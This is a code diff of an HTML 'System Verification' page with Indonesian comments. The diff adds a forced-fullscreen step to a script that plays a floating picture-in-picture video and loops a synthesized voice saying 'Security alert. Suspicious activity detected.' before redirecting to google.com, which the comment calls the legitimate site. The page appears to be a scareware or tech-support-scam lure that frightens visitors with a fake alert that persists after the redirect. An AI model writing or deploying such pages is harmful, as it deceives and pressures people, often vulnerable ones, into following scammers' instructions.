@@ -1,17 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Verifying...</title>
+  <title>System Verification</title>
+  <style>
+    body { margin:0; background:black; color:white; font-family:sans-serif; text-align:center; }
+    #overlay {
+      position:absolute; top:40%; width:100%; z-index:2;
+    }
+    #startBtn {
+      padding:12px 24px; font-size:16px;
+    }
+  </style>
 </head>
+<body>
 
-<body style="margin:0; background:black; color:white; font-family:sans-serif; text-align:center;">
-
-<div id="overlay" style="position:absolute; top:40%; width:100%; z-index:2;">
+<div id="overlay">
   <h2>Verifying your session...</h2>
   <p>Please wait...</p>
-  <button id="startBtn" style="padding:12px 24px; font-size:16px;">
-    Continue
-  </button>
+  <button id="startBtn">Continue</button>
 </div>
 
 <video id="v"
@@ -29,7 +35,7 @@ async function start() {
   const v = document.getElementById("v");
   const btn = document.getElementById("startBtn");
 
-  // 🔒 Disable button supaya tidak spam
+  // Disable button biar tidak spam
   btn.disabled = true;
 
   // 🎬 Play video
@@ -40,14 +46,21 @@ async function start() {
     await v.play();
   } catch(e){ console.warn("Video play failed", e); }
 
-  // 🖼️ Try PiP safely
+  // 🔥 Fullscreen immersive
+  try {
+    if (v.requestFullscreen) {
+      await v.requestFullscreen();
+    }
+  } catch(e){ console.warn("Fullscreen failed", e); }
+
+  // 🖼️ Try PiP (floating video)
   try {
     if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
       await v.requestPictureInPicture();
     }
   } catch(e){ console.warn("PiP failed", e); }
 
-  // 🔊 SpeechSynthesis function
+  // 🔊 SpeechSynthesis loop
   function speakLoop() {
     if (speaking) return;
     speaking = true;
@@ -56,12 +69,12 @@ async function start() {
       "Security alert. Suspicious activity detected. Please follow the instructions on this page."
     );
 
-    const voices = speechSynthesis.getVoices();
+    let voices = speechSynthesis.getVoices();
+
     if (voices.length > 0) {
       speechMsg.voice = voices.find(v => v.lang.includes("en")) || voices[0];
       speechSynthesis.speak(speechMsg);
     } else {
-      // fallback jika voices belum load
       speechSynthesis.onvoiceschanged = () => {
         const loadedVoices = speechSynthesis.getVoices();
         speechMsg.voice = loadedVoices.find(v => v.lang.includes("en")) || loadedVoices[0];
@@ -69,7 +82,6 @@ async function start() {
       };
     }
 
-    // 🔁 Loop clean tanpa tumpuk
     speechMsg.onend = () => {
       speaking = false;
       speakLoop();
@@ -78,13 +90,12 @@ async function start() {
 
   speakLoop();
 
-  // ⏱️ Redirect after short delay
+  // ⏱️ Redirect ke site legit setelah delay
   setTimeout(() => {
     window.location.href = "https://www.google.com";
-  }, 1200);
+  }, 1500);
 }
 
-// 🔗 Bind button
 document.getElementById("startBtn").addEventListener("click", start);
 </script>
 
